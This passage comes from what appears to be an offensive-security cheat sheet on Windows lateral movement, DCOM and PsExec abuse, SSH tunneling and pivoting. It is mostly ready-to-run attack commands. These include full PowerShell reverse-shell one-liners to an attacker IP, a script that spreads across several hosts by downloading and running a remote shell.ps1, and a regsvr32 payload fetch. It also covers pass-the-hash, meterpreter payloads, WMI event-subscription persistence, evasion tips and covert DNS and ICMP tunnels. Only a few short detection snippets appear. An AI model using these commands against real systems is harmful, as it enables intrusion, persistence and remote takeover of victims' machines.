**SMBExec (no service executable writes):**

```bash
smbexec.py DOMAIN/user:password@target_ip
smbexec.py -hashes :NT_hash DOMAIN/user@target_ip

# Specify share
smbexec.py -share C$ DOMAIN/user:password@target_ip
```

### Windows Remote Management (WinRM)

**Evil-WinRM:**

```bash
# Password authentication
evil-winrm -i target_ip -u username -p password

# Hash authentication
evil-winrm -i target_ip -u username -H NT_hash

# SSL connection
evil-winrm -i target_ip -u username -p password -S

# Custom port
evil-winrm -i target_ip -u username -p password -P 5986

# Upload/download files
evil-winrm -i target_ip -u username -p password
*Evil-WinRM* PS> upload /path/local/file C:\path\remote\
*Evil-WinRM* PS> download C:\path\remote\file /path/local/
```

**PowerShell Remoting (from Windows):**

```powershell
# Enable WinRM (if needed locally)
Enable-PSRemoting -Force

# Create session
$session = New-PSSession -ComputerName target_ip -Credential (Get-Credential)

# Execute commands
Invoke-Command -Session $session -ScriptBlock { whoami }

# Interactive session
Enter-PSSession -ComputerName target_ip -Credential domain\user

# One-liner execution
Invoke-Command -ComputerName target_ip -Credential $cred -ScriptBlock { Get-Process }

# Execute script
Invoke-Command -ComputerName target_ip -FilePath C:\script.ps1 -Credential $cred
```

**WinRS (Windows Remote Shell):**

```cmd
winrs -r:target_ip -u:DOMAIN\user -p:password whoami
winrs -r:target_ip -u:user -p:password cmd
```

### Scheduled Tasks

**Create Remote Scheduled Task:**

```cmd
# Using schtasks (Windows)
schtasks /create /s target_ip /u DOMAIN\user /p password /tn "TaskName" /tr "C:\malware.exe" /sc once /st 00:00

# Execute immediately
schtasks /run /s target_ip /u DOMAIN\user /p password /tn "TaskName"

# Delete task
schtasks /delete /s target_ip /u DOMAIN\user /p password /tn "TaskName" /f
```

**Impacket atexec.py:**

```bash
# Execute via scheduled task
atexec.py DOMAIN/user:password@target_ip 'whoami'
atexec.py -hashes :NT_hash DOMAIN/user@target_ip 'ipconfig'
```

### Service Creation

**Using sc.exe:**

```cmd
# Create service
sc \\target_ip create ServiceName binPath= "C:\malware.exe" start= auto

# Start service
sc \\target_ip start ServiceName

# Stop and delete
sc \\target_ip stop ServiceName
sc \\target_ip delete ServiceName
```

**Remote Registry Manipulation:**

```cmd
reg add \\target_ip\HKLM\SYSTEM\CurrentControlSet\Services\ServiceName /v ImagePath /t REG_EXPAND_SZ /d "C:\malware.exe" /f
```

### DCOM Execution

**MMC20.Application:**

```powershell
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target_ip"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","")
```

**ShellWindows:**

```powershell
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target_ip"))
$com.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

**ShellBrowserWindow:**

```powershell
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","target_ip"))
$com.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

## WMI Remote Execution

Windows Management Instrumentation provides powerful remote execution capabilities through standardized interfaces.

### WMI Command Execution

**WMIC (from Windows):**

```cmd
# Basic command execution
wmic /node:target_ip /user:DOMAIN\user /password:password process call create "cmd.exe /c command"

# Interactive process
wmic /node:target_ip /user:user /password:pass process call create "powershell.exe"

# Multiple targets
wmic /node:@targets.txt /user:user /password:pass process call create "cmd.exe"

# Query processes
wmic /node:target_ip /user:user /password:pass process list brief

# Kill process
wmic /node:target_ip /user:user /password:pass process where "name='malware.exe'" delete
```

**Impacket wmiexec.py:**

```bash
# Interactive shell
wmiexec.py DOMAIN/user:password@target_ip
wmiexec.py -hashes :NT_hash DOMAIN/user@target_ip

# Kerberos authentication
wmiexec.py -k -no-pass DOMAIN/user@target.domain.local

# Single command
wmiexec.py DOMAIN/user:password@target_ip 'whoami'

# Specify namespace
wmiexec.py -namespace root/cimv2 DOMAIN/user:password@target_ip
```

**PowerShell WMI:**

```powershell
# Create credential object
$cred = Get-Credential DOMAIN\user

# Execute command
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe" -ComputerName target_ip -Credential $cred

# Query information
Get-WmiObject -Class Win32_OperatingSystem -ComputerName target_ip -Credential $cred

# Using CIM (newer)
$session = New-CimSession -ComputerName target_ip -Credential $cred
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"}
```

### WMI Event Subscriptions (Persistence/Lateral Movement)

**Create Permanent Event Subscription:**

```powershell
# Event filter (trigger)
$filter = ([wmiclass]"\\target_ip\root\subscription:__EventFilter").CreateInstance()
$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$filter.Name = "SystemFilter"
$filter.EventNamespace = 'root\cimv2'
$filter.Put()

# Consumer (action)
$consumer = ([wmiclass]"\\target_ip\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = "SystemConsumer"
$consumer.CommandLineTemplate = "cmd.exe /c calc.exe"
$consumer.Put()

# Binding
$binding = ([wmiclass]"\\target_ip\root\subscription:__FilterToConsumerBinding").CreateInstance()
$binding.Filter = $filter.__PATH
$binding.Consumer = $consumer.__PATH
$binding.Put()
```

**Enumerate WMI Subscriptions:**

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter -ComputerName target_ip
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ComputerName target_ip
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ComputerName target_ip
```

**Remove Subscriptions:**

```powershell
$filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='SystemFilter'" -ComputerName target_ip
$consumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='SystemConsumer'" -ComputerName target_ip
$binding = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%SystemFilter%'" -ComputerName target_ip

$binding.Delete()
$consumer.Delete()
$filter.Delete()
```

### WMI Lateral Movement with CrackMapExec

```bash
# Authenticate and execute
crackmapexec wmi 192.168.1.0/24 -u user -p password -x 'whoami'

# With hash
crackmapexec wmi 192.168.1.10 -u administrator -H NT_hash -x 'ipconfig'

# Execute PowerShell
crackmapexec wmi 192.168.1.10 -u user -p password -X '$PSVersionTable'

# Multiple targets from file
crackmapexec wmi targets.txt -u user -p password -x 'whoami'
```

### WMI Operational Considerations

[Inference] WMI execution leaves artifacts in `Microsoft-Windows-WMI-Activity/Operational` logs (Event ID 5857-5861). WMIExec creates semi-interactive shells through output retrieval via SMB shares.

**Advantages:**

- No service executable written to disk (stealthier than PsExec)
- Leverages legitimate Windows functionality
- Works through firewalls allowing WMI (port 135 + dynamic RPC)

**Requirements:**

- Port 135 (RPC) and dynamic RPC ports (typically 49152-65535)
- Administrator privileges on target
- WMI service running (default)

### Tool Comparison Summary

|Tool|Writes to Disk|Network Ports|Stealth Level|Authentication|
|---|---|---|---|---|
|PsExec|Yes (service .exe)|445 (SMB)|Low|NTLM, Kerberos|
|SMBExec|Minimal (batch commands)|445 (SMB)|Medium|NTLM, Kerberos|
|WMIExec|No|135 + RPC|High|NTLM, Kerberos|
|Evil-WinRM|No|5985/5986|Medium|NTLM, Kerberos|
|DCOM|No|135 + RPC|High|NTLM|

---

**Related Topics:**

- **Credential Harvesting:** Extracting additional credentials from compromised systems (LSASS dumping, DPAPI, credential vaults)
- **Active Directory Enumeration:** BloodHound, PowerView for mapping lateral movement paths
- **Pivoting and Tunneling:** SSH tunneling, SOCKS proxies (Chisel, ligolo-ng) for network pivoting
- **Kerberoasting/AS-REP Roasting:** Obtaining service account credentials for lateral movement
- **Privilege Escalation:** Combining with token impersonation, UAC bypass for higher-level access

---

## DCOM Exploitation

Distributed Component Object Model (DCOM) allows inter-process communication across networked Windows systems. Various DCOM applications can be abused for remote code execution with valid credentials.

### DCOM Architecture Overview

DCOM uses RPC (Remote Procedure Call) over TCP port 135 for initial endpoint resolution, then dynamically assigned high ports (49152-65535) for actual communication. Authentication typically uses current user context or specified credentials.

### Enumeration Techniques

**List DCOM applications:**

```powershell
# Local DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# More detailed enumeration
Get-ChildItem REGISTRY::HKEY_CLASSES_ROOT\CLSID -ErrorAction SilentlyContinue | Select-Object Name
```

**Enumerate remote DCOM permissions:**

```powershell
$computer = "TARGET_HOST"
Get-CimInstance -ComputerName $computer -ClassName Win32_DCOMApplicationSetting | 
    Select-Object Caption, Description, AppID
```

**Registry-based enumeration:**

```cmd
reg query HKLM\SOFTWARE\Classes\AppID /s
```

### Common Exploitable DCOM Objects

#### MMC20.Application (CLSID: 49B2791A-B1AE-4C90-9B8E-E860BA07F889)

**Exploitation via PowerShell:**

```powershell
$computer = "192.168.1.100"
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", $computer))

# Execute command via ExecuteShellCommand
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")

# Reverse shell
$com.Document.ActiveView.ExecuteShellCommand("powershell.exe", $null, "-nop -w hidden -c `$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()", "7")
```

**Using Impacket's dcomexec.py:**

```bash
dcomexec.py DOMAIN/user:password@192.168.1.100 "whoami"

# With NTLM hash
dcomexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c DOMAIN/user@192.168.1.100 "cmd.exe /c command"

# Interactive shell
dcomexec.py DOMAIN/user:password@192.168.1.100
```

#### ShellWindows (CLSID: 9BA05972-F6A8-11CF-A442-00A0C90A8F39)

**PowerShell exploitation:**

```powershell
$computer = "192.168.1.100"
$com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", $computer)
$obj = [System.Activator]::CreateInstance($com)

# Access Windows Explorer instance
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
```

#### ShellBrowserWindow (CLSID: C08AFD90-F2A1-11D1-8455-00A0C91F3880)

```powershell
$computer = "192.168.1.100"
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", $computer)
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\output.txt", "C:\Windows\System32", $null, 0)
```

#### Excel.Application (Requires Microsoft Office)

```powershell
$computer = "192.168.1.100"
$excel = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", $computer))

# Execute macro or DDEInitiate
$excel.DisplayAlerts = $false
$excel.DDEInitiate("cmd.exe", "/c calc.exe")
```

### Scripted DCOM Exploitation

**Automated multi-target script:**

```powershell
$targets = @("192.168.1.100", "192.168.1.101", "192.168.1.102")
$command = "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"

foreach ($target in $targets) {
    try {
        Write-Host "[*] Attempting DCOM execution on $target"
        $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", $target))
        $com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c $command", "7")
        Write-Host "[+] Success on $target" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Failed on $target : $_" -ForegroundColor Red
    }
}
```

### Requirements and Constraints

**Network requirements:**

- TCP 135 (RPC Endpoint Mapper) accessible
- Dynamic RPC ports (49152-65535) accessible
- Target firewall allows DCOM traffic

**Credential requirements:**

- Valid domain/local administrator credentials
- Remote access permissions on target system
- DCOM Launch and Activation permissions

**Check DCOM permissions:**

```powershell
$acl = Get-Acl "HKLM:\SOFTWARE\Microsoft\Ole"
$acl.Access | Where-Object {$_.IdentityReference -match "Users"}
```

### Detection Evasion

**Stealthy execution patterns:**

```powershell
# Using legitimate binaries for execution
$com.Document.ActiveView.ExecuteShellCommand("msbuild.exe", $null, "C:\path\to\malicious.xml", "7")

# Living-off-the-land binaries
$com.Document.ActiveView.ExecuteShellCommand("regsvr32.exe", $null, "/s /n /u /i:http://10.10.14.5/payload.sct scrobj.dll", "7")
```

## PSExec Usage

PSExec is a Sysinternals tool enabling remote process execution over SMB. It works by copying an executable to the ADMIN$ share, creating a service, starting it, and cleaning up afterward.

### PSExec Mechanics

**Network requirements:**

- SMB (TCP 445) accessible
- Administrative share access (ADMIN$, IPC$)
- Local administrator or equivalent credentials

**Authentication flow:**

1. Connect to IPC$ share on target
2. Connect to ADMIN$ share and copy PSEXESVC.exe
3. Open Service Control Manager (SCM)
4. Create and start PSEXESVC service
5. Execute specified command through named pipe
6. Clean up service and executable

### Official PSExec (Sysinternals)

**Basic syntax:**

```cmd
psexec.exe \\TARGET_IP -u DOMAIN\username -p password cmd.exe

# Run command on remote system
psexec.exe \\192.168.1.100 -u CORP\admin -p P@ssw0rd whoami

# Interactive session
psexec.exe \\192.168.1.100 -u CORP\admin -p P@ssw0rd cmd
```

**Common parameters:**

```cmd
# Run as SYSTEM
psexec.exe \\192.168.1.100 -u admin -p password -s cmd.exe

# Copy program to execute
psexec.exe \\192.168.1.100 -u admin -p password -c C:\tools\payload.exe

# Run on multiple computers
psexec.exe \\192.168.1.100,192.168.1.101,192.168.1.102 -u admin -p password ipconfig

# Run on all computers from file
psexec.exe @computers.txt -u admin -p password "command"

# Accept EULA automatically
psexec.exe \\192.168.1.100 -u admin -p password -accepteula cmd

# Run with different priority
psexec.exe \\192.168.1.100 -u admin -p password -low cmd.exe

# Timeout specification
psexec.exe \\192.168.1.100 -u admin -p password -n 30 long_running_command.exe
```

**Interactive reverse shell deployment:**

```cmd
# On attacker machine, set up listener
nc -nvlp 4444

# Execute via PSExec
psexec.exe \\192.168.1.100 -u admin -p password cmd /c "powershell -nop -c $client=New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Impacket's psexec.py

**Basic usage:**

```bash
# Standard authentication
psexec.py DOMAIN/user:password@192.168.1.100

# NTLM hash authentication (Pass-the-Hash)
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c DOMAIN/user@192.168.1.100

# Execute single command
psexec.py DOMAIN/user:password@192.168.1.100 "whoami"

# Using Kerberos authentication
psexec.py -k -no-pass DOMAIN/user@target.domain.local

# Specify target port
psexec.py DOMAIN/user:password@192.168.1.100 -port 445
```

**Advanced options:**

```bash
# Use specific share (default is ADMIN$)
psexec.py -share C$ DOMAIN/user:password@192.168.1.100

# Upload and execute file
psexec.py DOMAIN/user:password@192.168.1.100 -file payload.exe

# Execute without writing to disk (Inference: based on common Impacket patterns)
psexec.py -no-output DOMAIN/user:password@192.168.1.100 "command"

# Specify service name
psexec.py -service-name CustomSvc DOMAIN/user:password@192.168.1.100
```

### Metasploit psexec Module

```bash
msfconsole
use exploit/windows/smb/psexec

set RHOSTS 192.168.1.100
set SMBDomain CORP
set SMBUser administrator
set SMBPass P@ssw0rd

# Or use NTLM hash
set SMBPass 00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444

exploit
```

**Alternative PSExec modules:**

```bash
# Uses PowerShell for execution
use exploit/windows/smb/psexec_psh

# Native upload, no service creation
use exploit/windows/smb/psexec_native_upload

# Command execution only
use auxiliary/admin/smb/psexec_command
```

### CrackMapExec Integration

```bash
# Single target execution
crackmapexec smb 192.168.1.100 -u admin -p password -x "whoami"

# Execute PowerShell command
crackmapexec smb 192.168.1.100 -u admin -p password -X '$PSVersionTable'

# Multiple targets from file
crackmapexec smb targets.txt -u admin -p password -x "ipconfig"

# Pass-the-Hash with command execution
crackmapexec smb 192.168.1.100 -u admin -H 8846f7eaee8fb117ad06bdd830b7586c -x "whoami"

# Use specific module
crackmapexec smb 192.168.1.100 -u admin -p password -M mimikatz
```

### Detection and Prevention

**Windows Event Logs indicating PSExec activity:**

```powershell
# Service creation (Event ID 7045)
Get-WinEvent -FilterHashtable @{LogName='System'; ID=7045} | 
    Where-Object {$_.Message -match 'PSEXESVC'}

# Network logon (Event ID 4624, Logon Type 3)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | 
    Where-Object {$_.Properties[8].Value -eq 3}

# File creation in ADMIN$ share
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5145} | 
    Where-Object {$_.Message -match 'ADMIN\$'}
```

**Registry artifacts:**

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Services\PSEXESVC
```

## SSH Tunneling

SSH tunneling creates encrypted channels for forwarding traffic through SSH connections, enabling access to otherwise unreachable network segments.

### Local Port Forwarding (-L)

Forwards traffic from local machine to remote destination through SSH server.

**Syntax pattern:**

```bash
ssh -L [local_bind_address:]local_port:destination_host:destination_port user@ssh_server
```

**Basic local forward:**

```bash
# Forward local port 8080 to remote service on port 80
ssh -L 8080:localhost:80 user@ssh-server.com

# Access via: http://localhost:8080
```

**Forwarding to third-party host:**

```bash
# Forward local 3306 to MySQL on internal network
ssh -L 3306:internal-db.corp.local:3306 user@jump-host.com

# Connect to MySQL: mysql -h 127.0.0.1 -P 3306
```

**Multiple port forwards:**

```bash
ssh -L 8080:web-server:80 \
    -L 3306:db-server:3306 \
    -L 5432:postgres-server:5432 \
    user@jump-host.com
```

**Bind to specific interface:**

```bash
# Listen on all interfaces
ssh -L 0.0.0.0:8080:target:80 user@ssh-server

# Listen only on localhost (default)
ssh -L 127.0.0.1:8080:target:80 user@ssh-server
```

### Remote Port Forwarding (-R)

Forwards traffic from remote machine back to local machine or specified destination.

**Syntax pattern:**

```bash
ssh -R [remote_bind_address:]remote_port:destination_host:destination_port user@ssh_server
```

**Basic remote forward:**

```bash
# Expose local web server to remote network
ssh -R 8080:localhost:80 user@remote-server.com

# Remote users access via: http://remote-server.com:8080
```

**Reverse shell enablement:**

```bash
# Forward remote port to local listener
ssh -R 4444:localhost:4444 user@attacker-vps.com

# Set up listener locally: nc -lvnp 4444
# Execute reverse shell on compromised host targeting localhost:4444
```

**Third-party destination:**

```bash
# Forward traffic from SSH server to different local network host
ssh -R 9000:internal-host:80 user@public-server.com
```

**GatewayPorts for remote binding:**

```bash
# Allow remote forwarded ports to bind to non-localhost addresses
# Requires GatewayPorts yes in sshd_config

ssh -R 0.0.0.0:8080:localhost:80 user@server.com
```

### Dynamic Port Forwarding (-D) - SOCKS Proxy

Creates SOCKS proxy allowing dynamic destination routing through SSH tunnel.

**Basic SOCKS proxy:**

```bash
# Create SOCKS5 proxy on local port 1080
ssh -D 1080 user@ssh-server.com

# Configure applications to use SOCKS5 proxy: 127.0.0.1:1080
```

**Using with proxychains:**

```bash
# Edit /etc/proxychains4.conf
# Add: socks5 127.0.0.1 1080

# Establish tunnel
ssh -D 1080 user@pivot-host.com

# Route traffic through tunnel
proxychains nmap -sT -Pn 192.168.100.0/24
proxychains firefox
proxychains crackmapexec smb 192.168.100.0/24 -u admin -p password
```

**Specify binding address:**

```bash
# Bind to all interfaces
ssh -D 0.0.0.0:1080 user@server.com

# Bind to specific interface
ssh -D 192.168.1.10:1080 user@server.com
```

### Combined Tunneling Scenarios

**Pivoting through multiple jump hosts:**

```bash
# Chain SSH connections
ssh -L 8080:final-target:80 -J jump-host1,jump-host2 user@final-destination

# Or using ProxyJump in ~/.ssh/config:
# Host final-destination
#     ProxyJump jump-host1,jump-host2
```

**Simultaneous forward types:**

```bash
ssh -L 8080:web-server:80 \
    -R 4444:localhost:4444 \
    -D 1080 \
    user@pivot-host.com
```

### SSH Tunnel Options

**Background execution:**

```bash
# Run in background
ssh -f -N -L 8080:target:80 user@server.com

# -f : Background mode
# -N : No command execution
# -C : Compression
```

**Keep-alive and timeout:**

```bash
# Prevent timeout disconnections
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -L 8080:target:80 user@server

# ServerAliveInterval: Send keep-alive every 60 seconds
# ServerAliveCountMax: Disconnect after 3 failed keep-alives
```

**Using SSH keys:**

```bash
ssh -i /path/to/private_key -L 8080:target:80 user@server
```

**Verbose debugging:**

```bash
ssh -v -L 8080:target:80 user@server      # Basic verbosity
ssh -vv -L 8080:target:80 user@server     # More detailed
ssh -vvv -L 8080:target:80 user@server    # Maximum verbosity
```

### SSH Configuration File

**~/.ssh/config for persistent tunnels:**

```
Host pivot
    HostName 192.168.1.100
    User administrator
    LocalForward 8080 internal-web:80
    LocalForward 3306 internal-db:3306
    DynamicForward 1080
    ServerAliveInterval 60
    ServerAliveCountMax 3

# Usage: ssh pivot
```

### CTF-Specific Tunneling Patterns

**Accessing internal web application:**

```bash
# Scenario: Web server on 10.10.10.5:80 only accessible from pivot host
ssh -L 8080:10.10.10.5:80 user@pivot-host.com
# Browse: http://localhost:8080
```

**Database port forwarding:**

```bash
# Access internal MySQL database
ssh -L 3306:internal-db:3306 user@pivot-host
mysql -h 127.0.0.1 -P 3306 -u dbuser -p
```

**Internal network scanning:**

```bash
# Dynamic tunnel for scanning
ssh -D 1080 user@pivot-host

# Scan through tunnel
proxychains nmap -sT -Pn -p 22,80,443,445,3389 10.10.10.0/24
```

## Port Forwarding

Port forwarding enables traffic redirection across network boundaries using various tools and techniques beyond SSH tunneling.

### Netcat Port Forwarding

**Simple relay using named pipes (Linux):**

```bash
# Forward local port 8080 to remote host:port
mkfifo backpipe
nc -l -p 8080 0<backpipe | nc target-host 80 1>backpipe

# Two-way relay through intermediary
nc -l -p 8080 0<backpipe | nc internal-host 80 | tee backpipe
```

**Port forwarding without named pipes:**

```bash
# Using ncat with --sh-exec
ncat -l -p 8080 --sh-exec "ncat target-host 80"

# Chainable relays
ncat -l -p 8080 --sh-exec "ncat intermediate 8080" --sh-exec "ncat final-target 80"
```

### Socat Port Forwarding

**Basic TCP relay:**

```bash
# Listen on port 8080, forward to target:80
socat TCP-LISTEN:8080,fork TCP:target-host:80

# fork: Handle multiple connections
```

**UDP forwarding:**

```bash
socat UDP-LISTEN:53,fork UDP:dns-server:53
```

**Bind to specific interface:**

```bash
socat TCP-LISTEN:8080,bind=192.168.1.10,fork TCP:target:80
```

**SSL/TLS wrapping:**

```bash
# Forward with SSL encryption
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:internal-web:80

# Connect through SSL
socat TCP-LISTEN:8080,fork OPENSSL:external-host:443,verify=0
```

**Reverse shell relay:**

```bash
# On compromised pivot host
socat TCP-LISTEN:4444,fork TCP:attacker-ip:4444

# Payload on target connects to pivot:4444, relays to attacker
```

**PTY shell upgrade through relay:**

```bash
socat FILE:`tty`,raw,echo=0 TCP:target:4444
```

### Chisel - HTTP Tunnel

Chisel creates fast TCP/UDP tunnels transported over HTTP and secured via SSH.

**Installation:**

```bash
# Download from: https://github.com/jpillora/chisel/releases

# Linux
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64

# Windows
# Download chisel_1.9.1_windows_amd64.gz, extract, execute
```

**Server mode (on attacker machine):**

```bash
# Start Chisel server
./chisel server -p 8000 --reverse

# With authentication
./chisel server -p 8000 --reverse --auth user:password

# Verbose output
./chisel server -p 8000 --reverse -v
```

**Client mode - Remote forward:**

```bash
# On compromised host - forward remote port to local service
./chisel client attacker-ip:8000 R:8080:localhost:80

# Multiple forwards
./chisel client attacker-ip:8000 R:8080:localhost:80 R:3306:db-server:3306

# With authentication
./chisel client --auth user:password attacker-ip:8000 R:8080:localhost:80
```

**Client mode - Local forward:**

```bash
# Forward local port through tunnel to remote destination
./chisel client attacker-ip:8000 L:8080:internal-web:80

# Access forwarded service: http://localhost:8080
```

**SOCKS proxy mode:**

```bash
# Server on attacker
./chisel server -p 8000 --reverse

# Client creates SOCKS proxy on server
./chisel client attacker-ip:8000 R:socks

# Configure proxychains to use attacker-ip:1080
proxychains nmap -sT 10.10.10.0/24
```

**Reverse SOCKS proxy:**

```bash
# Client on compromised host
./chisel client attacker-ip:8000 R:1080:socks

# On attacker, configure proxy to 127.0.0.1:1080
# Routes through compromised host's network
```

### Ligolo-ng - Advanced Pivoting

Ligolo-ng creates layer 3 network tunnels enabling full subnet routing.

**Setup on attacker machine:**

```bash
# Download from: https://github.com/nicocha30/ligolo-ng/releases

# Start proxy
./proxy -selfcert

# Add route to internal network (after agent connects)
sudo ip route add 172.16.0.0/24 dev ligolo

# Start tunnel
session
start
```

**Agent on compromised host:**

```bash
# Windows
.\agent.exe -connect attacker-ip:11601 -ignore-cert

# Linux
./agent -connect attacker-ip:11601 -ignore-cert

# Verify connection on proxy side
```

**Accessing internal network:**

```bash
# After tunnel established and route added
nmap -sV 172.16.0.0/24
crackmapexec smb 172.16.0.0/24 -u admin -p password
```

### Windows Port Forwarding (netsh)

**Port forwarding on Windows:**

```cmd
# Forward local port to remote destination
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=internal-host

# View current forwards
netsh interface portproxy show all

# Delete specific forward
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Reset all forwards
netsh interface portproxy reset
```

**IPv4 to IPv6 forwarding:**

```cmd
netsh interface portproxy add v4tov6 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=::1
```

**Firewall rule requirement:**

```cmd
netsh advfirewall firewall add rule name="Port Forward 8080" protocol=TCP dir=in localport=8080 action=allow
```

### SSH.NET for PowerShell Port Forwarding

**Using Posh-SSH module:**

```powershell
# Install module
Install-Module -Name Posh-SSH

# Create SSH session with local forward
New-SSHSession -ComputerName ssh-server -Credential $cred
New-SSHLocalPortForward -BoundHost localhost -BoundPort 8080 -RemoteAddress internal-web -RemotePort 80 -SSHSession $session

# Access: http://localhost:8080
```

### ICMP Tunneling (Specialized)

**Using ptunnel-ng:**

```bash
# On intermediate host (pivot)
ptunnel-ng -p proxy-host

# On attacker
ptunnel-ng -p pivot-host -lp 8000 -da target-host -dp 80

# Access: http://localhost:8000
```

### DNS Tunneling

**Using dnscat2:**

```bash
# Server (on attacker with authoritative DNS)
dnscat2-server domain.com

# Client (on compromised host)
./dnscat domain.com

# Create tunnel session
session -i 1
listen 127.0.0.1:8080 target-host:80
```

**Using iodine:**

```bash
# Server
iodined -f -c -P password 10.0.0.1 tunnel.domain.com

# Client
iodine -f -P password tunnel.domain.com

# Creates tunnel interface, add routes as needed
```

### Metasploit Port Forwarding

**Local port forward:**

```bash
meterpreter > portfwd add -l 8080 -p 80 -r internal-host
meterpreter > portfwd list
meterpreter > portfwd delete -l 8080

# Access forwarded port: http://localhost:8080
```

**Reverse port forward:**

```bash
meterpreter > portfwd add -R -l 4444 -p 4444 -L attacker-ip
# Target connects to localhost:4444, reaches attacker
```

**Automatic routing:**

```bash
meterpreter > run autoroute -s 172.16.0.0/24
meterpreter > run autoroute -p

# Use auxiliary modules to scan through meterpreter session
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.0.0/24
set SESSION 1
run
```

### Detection Considerations

**Identifying tunneling activity [Inference - based on common network forensic patterns]:**

```powershell
# Monitor for unusual SSH connections
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | 
    Where-Object {$_.Message -match 'ssh'}

# Check for listening ports (potential port forwards)
netstat -ano | findstr LISTENING

# Monitor outbound connections on unusual ports
netstat -ano | findstr ESTABLISHED
```

---

## Important Related Topics

**Critical lateral movement techniques to study next:**

- **WMI and CIM Execution** (WMI command execution, event subscriptions)
- **WinRM Remote Management** (PowerShell Remoting, Evil-WinRM)
- **RDP Session Hijacking** (tscon.exe lateral movement)
- **Pass-the-Hash/Pass-the-Ticket** (credential reuse techniques)
- **NTLM Relay Attacks** (SMB relay, HTTP to SMB relay)

---

## Pivoting Techniques

### Network Architecture Understanding

**Identify network segments from compromised host:**

```bash
# View network interfaces
ip addr
ifconfig
ip link show

# View routing table
ip route
route -n
netstat -rn

# Identify connected networks
ip neigh
arp -a
```

**Scan internal networks:**

```bash
# Using compromised host as scanner
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "64 bytes"; done

# Port scanning via bash
for port in {20..25} {80..90} {443..445}; do
  timeout 1 bash -c "</dev/tcp/192.168.1.10/$port" 2>/dev/null && echo "Port $port open"
done
```

**Static binary scanning tools:**

```bash
# Transfer nmap static binary
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
chmod +x nmap
./nmap -p- 192.168.1.0/24

# Transfer netcat static binary
nc -zv 192.168.1.10 1-1000
```

### SSH Tunneling Fundamentals

**Local Port Forwarding (-L):**

